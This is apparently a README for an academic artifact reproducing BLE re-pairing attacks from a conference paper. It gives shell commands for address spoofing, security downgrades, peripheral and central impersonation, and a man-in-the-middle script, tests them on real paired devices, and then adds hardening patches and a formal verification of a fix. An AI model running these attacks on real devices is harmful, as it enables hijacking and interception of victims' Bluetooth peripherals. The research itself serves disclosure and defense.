# BLE Re-Pairing Attacks PoC

This repository contains the attacks PoCs as described in the paper [BLERP: BLE Re-Pairing Attacks and Defenses](https://github.com/sacca97/blerp/blob/main/paper.pdf) accepted at NDSS 26'.

The artifact will also be available at [doi.org/10.5281/zenodo.17671927](https://doi.org/10.5281/zenodo.17671927)

## Requirements

**Hardware:**
  * 2 Nordic nRF52840-DK (PCA10056)
  * Additional BLE devices to test (no BLE Audio)
  
> Note: two nRF52s are enough to test the attacks in a "controlled scenario" where one board acts first as a legitimate device and then as the attacker.

**Software:**

  * Ubuntu 22.04+ or Fedora 40+
  * [Arm GNU Toolchain 14.3.Rel1](https://developer.arm.com/downloads/-/arm-gnu-toolchain-downloads) (arm-none-eabi)
  * [Segger JLink V7.98h+](https://www.segger.com/downloads/jlink/)
  * [Apache newt v1.13.0](https://mynewt.apache.org)
  * Python 3.12+ (MitM attack only)
  * A serial device tool (e.g., [tio](https://github.com/tio/tio))

> Optional [pre-configured Docker Image](https://mega.nz/file/gFgWwQRI#MG3j7-RZQhSa_X6vHkWsDvhzKCuRotE7CfWKnspqNLA). Download and load it with `docker load -i blerp.tar.gz`. Then run it with

```bash
docker run -it --user blerp -w /home/blerp/blerp --privileged --name blerp-test --net host -v /dev:/dev -v /var/run/dbus:/var/run/dbus blerp:1.0 bash
```


## Toolkit Setup

> Expected Time: 5-10 minutes

1. Setup the workspace and patch the NimBLE stack

```bash
git clone https://github.com/sacca97/blerp
cd blerp
./setup.sh
./apply_attacks_patch.sh
```

2. Run the following commands once per board to install the OS and bleshell app. The `id` parameter is the board's 10-digit serial number, which is physically printed on the board, but can also be shown using `tio -l | grep SEGGER`, whose output should look like `J-Link_00XXXXXXXXXX-if00`.

```bash
make boot-10056 id=XXXXXXXXXX && make bleshell id=XXXXXXXXXX
```

3. Connect via serial and press _Tab_ to show the available commands and verify the installation was succesfull.

```bash
tio /dev/serial/by-id/usb-SEGGER_J-Link_00XXXXXXXXXX-if00
```

Once connected, pressing Tab will show the list of available commands.


## Testing In a Controlled Environment

> Expected Time: 3 minutes

Test the impersonation attacks on the NimBLE stack using only two nRF52 boards. The firmware resets on power loss (erasing the keys), enabling one board to act first as a legitimate device and then as the attacker.

### Initial Setup

> Expected Time: 1 minute

Configure and pair the two boards interacting with them via the shell and using these exact commands. On the Peripheral run:
```sh
spoof-address addr=F8:4C:6D:E9:7A:B1 addr_type=random
spoof-adv-data name="MyMouse" appearance=962
advertise own_addr_type=random
```
On the Central run:
```sh
spoof-address addr=00:1A:79:FF:EE:DD addr_type=public
connect peer_addr=F8:4C:6D:E9:7A:B1 peer_addr_type=random own_addr_type=public
```
Ensure the logs show:
```sh
encryption change event; status=0
encrypted=1, authenticated=0, bonded=1
```

### Peripheral Impersonation

> Expected Time: 1 minute

The Peripheral board will now act as the attacker. Power cycle the Peripheral to clear its keys (simulating the attacker taking its place), then configure it for the attack:
```bash
# Set again the victim's address
spoof-address addr=F8:4C:6D:E9:7A:B1 addr_type=random

# Downgrade security parameters
spoof-authreq mitm=1 bond=1 sc=1
security-set-data mitm=0 sc=0 keysize=7
blerp-reject-enc val=1

# Begin malicious advertising
advertise own_addr_type=random
```
On the Central device run the `connect` command again (with the same parameters). The logs should show a connection with a partially zeroed-out Long Term Key (LTK) and status=0, indicating successful re-pairing.
```sh
LTK: 00000000000000000094d39485d06811
pairing complete; status=0
encryption change event; status=0
encrypted=1, authenticated=0, bonded=1
```

### Central Impersonation

> Expected Time: 1 minute

If proceeding immediately after the Peripheral Impersonation attack, you must reset both boards and repeat the steps from the initial setup phase before starting. The board that was previously the Central will now act as the attacker. Power cycle the Central, then enter the following commands to configure it for the attack:
```sh
# Spoof the Legitimate Central's Address
spoof-address addr=00:1A:79:FF:EE:DD addr_type=public

# Downgrade Security Parameters
security-set-data mitm=0 sc=0 keysize=7
```
Connect the attacker board to the victim Peripheral.
```sh
connect peer_addr=F8:4C:6D:E9:7A:B1 peer_addr_type=random own_addr_type=public
```
If successful, the logs should be similar to the previous one, with a partially zeroed-out LTK and no errors (i.e., status=0).

## Real-World Device Testing

> Expected Time: 10 minutes (highly affected by the time needed to find the parameters for spoofing)

The commands are the same as those used in the controlled environment testing section, although the parameters are different and device-specific. 

### Peripheral Impersonation

1. Pair a Peripheral (e.g., a BLE mouse) with the victim Central. Once paired, turn off the Peripheral or move it out of range.
2. Configure the board to spoof the legitimate Peripheral. The address can be recovered from the Central's list of paired devices. The address type and device appearance must also match the actual one (e.g., 962 for mice, 961 for keyboards, or [others](https://www.bluetooth.com/specifications/assigned-numbers/)).

3. The attack will start as soon as the _advertise_ command is issued, as the victim Central will attempt to auto-reconnect to the Peripheral.

The attack is successful if the Peripheral logs report completed events with status=0, indicating success. The legitimate Peripheral should no longer work with the Central even when turned back on.
```bash
pairing complete; status=0
encryption change event; status=0
encrypted=1, authenticated=0, bonded=1
```

### Central Impersonation

1. Pair the target Peripheral with the legitimate Central, then turn off the legitimate Central (e.g., disable Bluetooth from settings).
2. Configure the board to spoof the Central using the same commands as before. Note that Centrals typically use a public address.
3. Issue _advertise_ on the Peripheral and then _connect_ from the Central with the correct parameters. The two devices will connect and the attack will start.

If successful, the log will show the same message as the Peripheral attack. The legitimate Central, once turned back on, will no longer be able to control the Peripheral.

## Double-Channel MitM

> Expected Time: 2 minutes

The attack requires two nRF52 boards connected to a computer acting as a single attacker to intercept and redirect traffic between two paired victim devices (e.g., a real phone and a real mouse). The boards must be connected via the micro USB port on the longer side.

1. Flash the specific MitM firmware onto both nRF52 boards. A clean install is recommended if coming from the previous tests. For each board, run the following command, replacing `id` with the board's serial number.
```sh
make erase id=XXXXXXXXXX
make boot-10056 id=XXXXXXXXXX
make hci-dev id=XXXXXXXXXX
```
2. Run the Python script with root privileges. Find the HCI device IDs  `--dev-ids` using `sudo btmgmt info` or `hcitool dev` and looking for addresses `00:00:00:00:00:00`.
```sh
sudo .venv/bin/python python-host/mitm.py --central-addr XX:XX:XX:XX:XX:XX --central-addr-type public --peripheral-name "Peripheral Name" --dev--ids X,Y
```

Now, disconnect the two legitimate devices by turning the Central's Bluetooth off. Once this is done, the script will:

1. Capture and clone the advertisement data from the **legitimate Peripheral**, then wait for user input to start the attack. 
2. The **malicious Central** will connect to the **legitimate Peripheral**, and the **malicious Peripheral** will begin advertising.
3. Once the logs say "Peripheral: Advertising Started", manually turn the **legitimate Central's** Bluetooth back on. 
4. The **legitimate Central** will reconnect to the **malicious Peripheral**, and the actual attack will start. 
5. The **legitimate Central** may be prompted with a Yes/No dialog to confirm pairing.


The script output should look similar to the following and if the attack is successful, the two devices should work but have a visible lag (e.g., if using a mouse or keyboard). The reported battery percentage of the Peripheral should be 69\%.

```sh
[11:44:01] Starting scanning
Press any key to start the attack.. 
[11:44:05] Central: Connection complete
[11:44:05] Advertising data copied
[11:44:05] Peripheral: Advertising started
[11:44:17] Peripheral: Connection complete
[11:44:17] Peripheral: Connection complete
Pairing Request: SM_Hdr / SM_Pairing_Request
[11:44:17] Central starting pairing procedure
[11:44:17] Forwarding from 1 to 0
[11:44:17] Forwarding from 0 to 1
[11:44:17] Peripheral sent security request
[11:44:17] Received Pairing Response
[11:44:17] Received Confirm
[11:44:17] Received Random
[11:44:17] Peripheral sent security request
[11:44:17] Received Pairing Request
[11:44:17] Central: Encryption enabled
```

## Testing Hardened Re-pairing

Apply the patch, re-flash the firmware on one of the nRF52, and repeat the attacks from the controlled environment testing.
```bash
./apply_fixes_patch.sh
make erase id=XXXXXXXXXX
make boot-10056 id=XXXXXXXXXX && make legitimate id=XXXXXXXXXX
``` 

In both cases, the hardened stack rejects the re-pairing attempt because the attacker is trying to downgrade the security parameters. The expected outcome is disconnection or re-pairing failure for both attacks.


## Verifying Authenticated Re-pairing {fix-2}

Verify with ProVerif. For download and installation please refer to the [official website](https://proverif.inria.fr). Once installed, run:

```sh
proverif formal/blerp_fix.pv
```

The model assumes a Dolev-Yao attacker with complete network control. It verifies that an attacker cannot complete re-pairing without knowledge of the original pairing key (authentication) and cannot tamper with the pairing messages (integrity). These two properties are formalized in a single query, which should evaluate to _true_. Additionally, we run a sanity check query that should evaluate to _false_, confirming that the protocol terminates correctly. The expected ProVerif output is the following:

```c
(* Integrity and Authentication *)
Query inj-event(end_B(k)) ==> inj-event(end_A(k)) is true.

(* Sanity check *)
Query not (event(end_A(k)) && event(end_B(k))) is false.
```
